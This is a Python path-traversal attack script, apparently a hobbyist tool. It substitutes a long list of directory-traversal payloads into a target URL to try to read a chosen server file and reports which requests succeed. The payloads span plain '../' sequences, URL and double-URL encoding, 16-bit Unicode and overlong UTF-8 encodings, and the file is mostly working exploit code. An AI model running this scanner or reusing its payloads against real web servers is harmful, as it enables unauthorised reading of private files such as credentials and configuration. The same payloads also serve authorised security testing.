# coded by 0xdyBlack404

import send_req
import pyloads
import handletArGS
import errorMSG
import decode
from sys import argv
from time import sleep
import socket
import requests
import color
import time
# VABILS
if "-h" in argv or "--help" in argv or "-help" in argv or "-hh" in argv :
    msg, panel = errorMSG.using()
    print(msg)
    time.sleep(0.5)
    print(panel)
    exit()
    
if handletArGS.send_arg(argv) != -1:
    url, mutod, file, respons, loop, add = handletArGS.send_arg(argv)
else :
    msg = errorMSG.errorInUsing()
    use, panel = errorMSG.using()
    print(msg)
    sleep(0.5)
    print(panel)
    sleep(0.5)
    print(use)
    exit()

def isRun():
    global url
    url_new_isRun = url
    url_new_isRun = url_new_isRun.replace("DYBLACK404", "")
    url_new_isRun = url_new_isRun.split("/")
    url_new_isRun = url_new_isRun[0]+'//'+url_new_isRun[2]+'/'
    try:
        response = requests.get(url_new_isRun)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        return False

def get_info():
    global url, file
    url_new_get_info = url
    url_new_get_info = url_new_get_info.replace("DYBLACK404", "")
    host = url_new_get_info.split("/")[2]
    try :
        ip = socket.gethostbyname(host)
    except socket.error as err:
        ip = "?.?.?.?"
    return url_new_get_info, host, ip


def handlet_input_file(file):
    new_file = ""
    if file[0] == "/" or file[0] == "\\" :
        new_file = file[1:]
    else :
        new_file = file
    return new_file

file = handlet_input_file(file)

def normal_scane(first_req, pyload_all):
    global loop , add, file, url, respons
    if add == "NULL" :
        add = ""
    
    if "DYBLACK404" not in url :
        msg, paner = errorMSG.using()
        print(paner)
        print(msg)
        exit()
    
    print("[+] START SCANE :")
    start = 0
    while start <= loop + 1:
        if start > 0 :
            py += pyload_all
        else:
            py = first_req
            
        pyload = py+file+add
        url_new = url.replace("DYBLACK404", pyload)
        try:
            req = send_req.send_http_req(url_new, respons)
            if req == 1:
                color.print_color_green("green", "[+] :", url_new)
            else:
                color.print_color_red("red", "[-] :", url_new)
        except KeyboardInterrupt as err:
            print("[+] STOP SCANE")
            print("[-] Good By !")
            exit()
        
        start += 1
        
# . = %c0%2e, %e0%40%ae, %c0ae
# / = %c0%af, %e0%80%af, %c0%2f
# \ = %c0%5c, %c0%80%5c

def main():
    mas , panel = errorMSG.using()
    print(panel)
    time.sleep(0.5)
    if isRun():
        print("[+] URL IS RUNNING")
        time.sleep(0.5)
        url_info, host, ip = get_info()
        print("[+] URL  :", url_info)
        print("[+] HOST :", host)
        print("[+] IP   :", ip)
        time.sleep(0.5)
        #### normale pyloads
        normal_scane("/","../")
        normal_scane("/", "..././")
        normal_scane("/", "....//")
        normal_scane("/", "..;/")
        normal_scane("\\","..\\")
        normal_scane("\\", "...\\.\\")
        normal_scane('\\/', "..\\/")
        #### URL encoding
        normal_scane("/", "..%2F")
        normal_scane("/", "..%5c")
        normal_scane("/", "%2e%2e%2F")
        normal_scane("/", "%2e%2e%5c")
        #### Double URL encoding
        normal_scane("/", "..%252f")
        normal_scane("/", "..%255c")
        normal_scane("/", "%252e%252e%252f")
        normal_scane("/", "%252e%252e%255c")
        #### 16 bits Unicode encoding
        normal_scane("/", "..%u2215")
        normal_scane("/", "..%u2216")
        normal_scane("/", "%u002e%u002e%u2215")
        normal_scane("\\", "%u002e%u002e%u2216")
        #### UTF-8 Unicode encoding
        normal_scane("/", "..%c0%af")
        normal_scane("/", "..%e0%80%af")
        normal_scane("/", "..%c0%2f")
        normal_scane("\\", "..%c0%5c")
        normal_scane("\\", "..%c0%80%5c")
        normal_scane("/", "%c0%2e%c0%2e%c0%af")
        normal_scane("/", "%e0%40%ae%e0%40%ae%e0%80%af")
        normal_scane("/", "%c0ae%c0ae%c0ae")
        normal_scane("\\", "%c0%2e%c0%2e%c0%5c")
        normal_scane("\\", "%e0%40%ae%e0%40%ae%c0%80%5c")
        #### last request 1
        normal_scane("/", "...%2F.%2F")
        normal_scane("/", "....%2F%2F")
        normal_scane("/", "..;%2F")
        normal_scane("\\", "...%5c.%5c")
        normal_scane('\\/', "..%5c%2F")
        normal_scane("/", "%2e%2e%2e%2F%2e%2F")
        normal_scane("/", "%2e%2e%2e%2e%2F%2F")
        normal_scane("/", "%2e%2e%3B%2F")
        normal_scane("\\", "%2e%2e%2e%5c%2e%5c")
        normal_scane('\\/', "%2e%2e%5c%2F")
        #### last request 2
        normal_scane("/", "...%252f.%252f")
        normal_scane("/", "....%252f%252f")
        normal_scane("/", "..;%252f")
        normal_scane("\\", "...%255c.%255c")
        normal_scane('\\/', "..%255c%252f")
        normal_scane("/", "%252e%252e%252e%252f%252e%252f")
        normal_scane("/", "%252e%252e%252e%252e%252f%252f")
        normal_scane("/", "%252e%252e%253B%252f")
        normal_scane("\\", "%252e%252e%252e%255c%252e%255c")
        normal_scane('\\/', "%252e%252e%255c%252f")
        
    else:
        print(errorMSG.url_is_not_fond())
        exit()